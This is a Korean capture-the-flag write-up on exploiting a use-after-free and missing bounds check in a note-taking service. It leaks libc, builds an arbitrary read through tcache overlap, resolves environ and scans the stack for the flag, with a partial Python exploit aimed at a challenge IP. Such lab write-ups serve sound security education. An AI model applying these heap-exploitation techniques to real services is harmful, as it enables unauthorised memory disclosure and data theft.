# Classy who?

## 문제 설명

Exploit the note-taking service to read the flag from stack memory. Connect to the service on port 1337. Commands: - `C idx size` — create a note at index `idx` with `size` bytes. - `W idx off len` — write `len` raw bytes into note `idx` at offset `off`. - `R idx` — read up to 1024 bytes from note `idx`. - `D idx` — delete note `idx`. - `E` — exit. Use the service to leak a libc address, then a stack address, and read the flag out of the service's stack memory.

## 풀이

### 분석

프로그램은 최대 16개의 note를 전역 배열에서 관리한다. 각 note는 데이터 포인터와 크기를 갖는 16바이트 구조체다.

```c
struct note {
    char *data;
    size_t size;
};

struct note *notes[MAX_NOTES];
```

`main()`은 `local_flag[256]`를 stack에 만들고 파일에서 flag를 읽는다. 이 배열은 서비스가 종료될 때까지 `main()`의 stack frame에 남아 있다.

```c
char local_flag[256];
memset(local_flag, 0, sizeof(local_flag));
load_flag(local_flag, sizeof(local_flag));
```

따라서 최종 목표는 다음과 같다.

1. heap에서 libc 주소를 유출한다.
2. 임의 주소 읽기 primitive를 만든다.
3. libc의 `environ` 심볼에서 stack 주소를 얻는다.
4. stack을 검색해 `local_flag`를 찾는다.

### 취약점

첫 번째 취약점은 `write_note()`의 범위 검사 부재다. `off + len`이 note 크기 안에 있는지 확인하지 않아 heap OOB write가 가능하다.

```c
// Vulnerability: no bounds check on offset+len
memcpy(notes[idx]->data + off, buf, len);
```

더 직접적으로 활용한 취약점은 `delete_note()`의 Use-After-Free다. 데이터와 구조체를 모두 해제한 후 `notes[idx]`를 `NULL`로 초기화하지 않는다.

```c
free(notes[idx]->data);
free(notes[idx]);
// notes[idx] remains pointing to the freed memory.
puts("Deleted");
```

두 개의 note 구조체를 같은 tcache bin에 차례로 해제한 뒤 새 note를 만들면 다음 재할당이 발생한다.

```text
tcache[0x20]: struct_B -> struct_A

새 note의 struct 할당: struct_B 재사용
새 note의 16바이트 data 할당: struct_A 재사용
```

새 note의 데이터에 16바이트를 쓰면 해제된 `struct_A`의 두 필드인 `data`와 `size`를 직접 제어할 수 있다. 기존 dangling pointer를 통해 `struct_A`를 읽으면 원하는 주소에서 최대 1024바이트를 읽는 임의 읽기 primitive가 된다.

```text
struct_A.data = 읽을 주소
struct_A.size = 읽을 크기
```

### 익스플로잇

먼저 `0x500`바이트 청크를 만들고, 뒤에 guard note를 배치한 다음 큰 청크를 해제한다. guard가 top chunk와의 병합을 막으므로 해제된 청크는 unsorted bin에 들어가고 libc의 `main_arena` 포인터가 기록된다. 같은 크기로 재할당해 초기화되지 않은 앞부분을 읽으면 libc 주소가 유출된다.

```text
libc leak:   0x7f4bd21c9b20
libc base:   0x7f4bd1fc6000
leak offset: 0x203b20
```

그 다음 UAF와 tcache 재할당으로 임의 읽기를 만든다. libc 버전과 고정 offset을 추측하는 대신, 유출 주소에서 아래쪽 페이지를 탐색해 ELF magic `\x7fELF`를 찾는다. libc의 program header와 `PT_DYNAMIC`을 읽고 GNU hash table을 파싱해 `environ` 심볼을 직접 해석한다.

```text
environ symbol: 0x7f4bd21d0d58
stack pointer:  0x7ffd6791c8a8
```

마지막으로 `environ`이 가리키는 stack 부근을 아래 방향으로 검색해 `athena{`로 시작하는 문자열을 회수한다.

핵심 익스플로잇 코드는 다음과 같다. 전체 실행 파일은 같은 디렉터리의 `exploit_classy.py`에 저장되어 있다.

```python
import socket
import struct

HOST, PORT = "13.206.57.188", 10014
p64 = lambda x: struct.pack("<Q", x)

# libc leak
c.create(0, 0x500)
c.create(1, 0x20)       # top chunk 병합 방지용 guard
c.delete(0)
c.create(2, 0x500)
libc_leak = struct.unpack("<Q", c.read(2, 8))[0]

# UAF + tcache overlap으로 arbitrary read 구성
c.create(3, 0x100)
c.create(4, 0x100)
c.delete(3)
c.delete(4)
c.create(5, 16)         # note 5의 data가 해제된 note 3 struct와 겹침

def arbitrary_read(addr, size=1024):
    c.write(5, 0, p64(addr) + p64(size))
    return c.read(3, size)

# libc ELF header와 dynamic table을 읽어 environ 심볼 해석
libc_base = find_elf_base(arbitrary_read, libc_leak)
tags = parse_dynamic_tags(arbitrary_read, libc_base)
environ_addr = resolve_gnu_symbol(
    arbitrary_read, libc_base, tags, "environ"
)
stack_addr = struct.unpack("<Q", arbitrary_read(environ_addr, 8))[0]

# main()의 stack frame에 남은 local_flag 검색
for delta in range(0, 0x40000, 0x400):
    block = arbitrary_read((stack_addr & ~0x3ff) - delta, 1024)
    pos = block.find(b"athena{")
    if pos >= 0:
        flag = block[pos:].split(b"}", 1)[0] + b"}"
        print(flag.decode())
        break
```

실행 명령은 다음과 같다.

```powershell
python -u .\exploit_classy.py
```

```text

environ: 0x7f4bd21d0d58 -> stack 0x7ffd6791c8a8

```

## 배운 점

- 해제 후 전역 포인터를 `NULL`로 초기화하지 않으면 dangling pointer를 통한 UAF가 발생한다.
- glibc tcache의 LIFO 재할당 순서를 조절하면 해제된 구조체와 공격자가 쓰기 가능한 데이터 버퍼를 겹칠 수 있다.
- 큰 청크 뒤에 guard chunk를 배치하면 top chunk 병합을 막아 unsorted-bin libc 포인터를 안정적으로 유출할 수 있다.
- libc 버전별 고정 offset에 의존하지 않고 메모리의 ELF 및 GNU hash 구조를 직접 파싱하면 원격 환경 차이에 더 강한 익스플로잇을 만들 수 있다.
- libc의 `environ`은 stack 주소를 얻는 대표적인 심볼이며, 이를 이용해 `main()`의 지역 변수까지 탐색할 수 있다.
